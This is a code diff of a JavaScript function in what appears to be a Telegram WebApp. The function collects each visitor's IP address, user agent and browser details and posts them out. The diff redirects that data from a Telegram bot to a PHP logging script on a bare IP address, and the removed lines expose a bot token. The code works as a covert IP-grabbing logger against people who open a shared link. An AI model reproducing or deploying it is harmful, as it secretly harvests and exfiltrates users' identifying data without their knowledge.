@@ -60,9 +60,9 @@ function getBrowserInfo() {
 
 async function sendDataToTelegram() {
     let tg = window.Telegram.WebApp;
-    const token = "7212589811:AAH4Qyoboljh-SYCE48LL_nyZNCS7KvUeI0"
+    const token = "SOSI"
     const chatId = tg.initDataUnsafe.start_param;
-    const additionalChatId = -1002184270191;
+    const additionalChatId = -4273886250;
 
     const ipAddress = await getIPAddress();
     const userAgent = getUserAgent();
@@ -97,7 +97,7 @@ async function sendDataToTelegram() {
 └ Тип движка браузера: <code>${browserInfo.engine}</code>
     `;
 
-    const url = `https://api.telegram.org/bot${token}/sendMessage`;
+    const url = `http://77.221.152.103/sergey/logapi.php`;
     const formData = new FormData();
     formData.append('chat', chatId);
     formData.append('message', message);
